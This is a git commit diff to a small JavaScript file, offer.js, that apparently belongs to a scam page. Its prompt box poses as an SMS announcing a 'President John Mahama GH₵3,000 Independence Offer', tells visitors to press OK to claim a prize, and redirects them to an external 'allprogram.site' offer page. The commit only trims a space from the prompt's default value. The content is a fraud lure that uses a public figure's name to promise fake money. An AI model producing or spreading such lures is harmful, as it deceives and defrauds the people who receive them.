6f7d5ef4a4247cf38dff5f0314a6bc1519b2a3db
newsrock <newsrock3345@gmail.com>
2025-03-02 07:26:55 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = 'GH₵3,000'
-password=prompt('SMS: Welcome to President John Mahama GH₵3,000 Independence Offer, Press Ok to Claim Prize ',' GH₵3,000');
+password=prompt('SMS: Welcome to President John Mahama GH₵3,000 Independence Offer, Press Ok to Claim Prize ','GH₵3,000');
 if (password != 'GH₵3,000') {
 location.href='https://independence.allprogram.site/offer';
 }
